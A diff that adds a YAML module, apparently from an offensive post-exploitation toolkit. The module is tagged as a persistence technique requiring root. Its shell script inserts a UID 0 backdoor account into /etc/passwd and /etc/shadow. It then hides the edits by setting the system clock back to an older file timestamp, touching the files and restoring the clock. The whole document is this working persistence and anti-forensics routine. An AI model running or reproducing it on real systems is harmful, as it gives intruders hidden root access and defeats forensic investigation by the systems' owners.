@@ -1,0 +1,21 @@
+name: "user creator"
+description: "Adds a user to the system"
+category: persistence
+need_root: true
+variables:
+  - name: username
+    description: "Username for new user"
+  - name: password
+    description: "Password for new user"
+priority: 1000
+tip: "User '{{username}}' with password '{{password}}' created"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  PASSWD_STRING="{{username}}:x:0:0:{{username}}:/root:/bin/bash"
+  SHADOW_STRING="{{username}}:$(mkpasswd --method=SHA-512 {{password}} || openssl passwd -6 {{password}}):18270::99999:7:::"
+  grep -qF -- $PASSWD_STRING /etc/passwd || sed -i "2 i $PASSWD_STRING" /etc/passwd
+  grep -qF -- $SHADOW_STRING /etc/shadow || sed -i "2 i $SHADOW_STRING" /etc/shadow
+  touch /etc/passwd /etc/shadow
+  date -s "$NOW"
+  unset NOW
